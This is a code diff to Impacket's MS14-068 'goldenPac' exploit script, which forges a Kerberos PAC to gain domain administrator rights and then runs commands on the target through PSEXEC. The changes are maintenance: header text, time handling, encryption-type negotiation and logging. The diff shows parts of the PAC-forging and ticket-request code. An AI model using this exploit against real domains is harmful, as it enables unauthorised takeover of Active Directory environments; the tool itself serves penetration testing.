@@ -1,20 +1,22 @@
 #!/usr/bin/env python
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# Author: Alberto Solino (@agsolino)
-#
 # Description:
-#   MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first! 
+#   MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first!
 #   Well done :).
-#   This one also established a SMBConnection and PSEXEcs the 
+#   This one also established a SMBConnection and PSEXEcs the
 #   target.
 #   A few important things:
 #   1) you must use the domain FQDN or use -dc-ip switch
-#   2) target must be a FQDN as well and matching the target's NetBIOS 
+#   2) target must be a FQDN as well and matching the target's NetBIOS
 #   3) Just RC4 at the moment - DONE (aes256 added)
 #   4) It won't work on Kerberos-only Domains (but can be fixed)
 #   5) Use WMIEXEC approach instead
@@ -28,8 +30,10 @@
 #       if domain.net and/or domain-host do not resolve, add them
 #       to the hosts file or use the -dc-ip and -target-ip parameters
 #
-from __future__ import division
-from __future__ import print_function
+# Author:
+#   Alberto Solino (@agsolino)
+#
+
 import cmd
 import logging
 import os
@@ -40,6 +44,7 @@ from binascii import unhexlify
 from threading import Thread, Lock
 from six import PY3
 
+from impacket import wintime
 from impacket.dcerpc.v5 import epm
 from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
     DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, \
@@ -61,11 +66,6 @@ from impacket.structure import Structure
 ################################################################################
 # HELPER FUNCTIONS
 ################################################################################
-
-def getFileTime(t):
-    t *= 10000000
-    t += 116444736000000000
-    return t
 
 class RemComMessage(Structure):
     structure = (
@@ -456,7 +456,7 @@ class MS14_068:
         # 1) KERB_VALIDATION_INFO
         aTime = timegm(strptime(str(authTime), '%Y%m%d%H%M%SZ'))
 
-        unixTime = getFileTime(aTime)
+        unixTime = wintime.posix_to_filetime(aTime)
 
         kerbdata = KERB_VALIDATION_INFO()
 
@@ -570,11 +570,11 @@ class MS14_068:
         # 2) PAC_CLIENT_INFO
         pacClientInfo = PAC_CLIENT_INFO()
         pacClientInfo['ClientId'] = unixTime
-        try:
-            name = self.__username.encode('utf-16le')
-        except UnicodeDecodeError:
+        username = self.__username
+        if isinstance(username, bytes):
             import sys
-            name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
+            username = username.decode(sys.getfilesystemencoding())
+        name = username.encode('utf-16le')
         pacClientInfo['NameLength'] = len(name)
         pacClientInfo['Name'] = name
         pacClientInfoBlob = pacClientInfo.getData()
@@ -714,11 +714,11 @@ class MS14_068:
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = decodedTGT['crealm'].prettyPrint()
 
-        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
-        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
+        seq_set_iter(reqBody, 'etype', getKerberosTGSRequestEnctypes())
         reqBody['enc-authorization-data'] = noValue
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
@@ -740,7 +740,7 @@ class MS14_068:
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-        now = datetime.datetime.utcnow() 
+        now = datetime.datetime.now(datetime.timezone.utc)
         authenticator['cusec'] =  now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
 
@@ -788,9 +788,10 @@ class MS14_068:
 
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
-        newSessionKey = Key(cipher.enctype, encTGSRepPart['key']['keyvalue'].asOctets())
-    
-        return r, cipher, sessionKey, newSessionKey
+        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
+        newCipher = _enctype_table[encTGSRepPart['key']['keytype']]
+
+        return r, newCipher, sessionKey, newSessionKey
 
     def getForestSid(self):
         logging.debug('Calling NRPC DsrGetDcNameEx()')
@@ -1054,11 +1055,12 @@ if __name__ == '__main__':
     from impacket.dcerpc.v5 import transport
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
-    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
+    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, \
+        getKerberosTGSRequestEnctypes, KerberosError
     from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, \
         AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
         EncTGSRepPart, ETYPE_INFO2_ENTRY
-    from impacket.krb5.crypto import Key
+    from impacket.krb5.crypto import Key, _enctype_table
     from impacket.dcerpc.v5.ndr import NDRULONG
     from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
         SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
@@ -1107,20 +1109,13 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts)
+    logger.init(options.ts, options.debug)
 
     domain, username, password, address = parse_target(options.target)
 
     if domain == '':
         logging.critical('Domain should be specified!')
         sys.exit(1)
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
 
     if password == '' and username != '' and options.hashes is None:
         from getpass import getpass
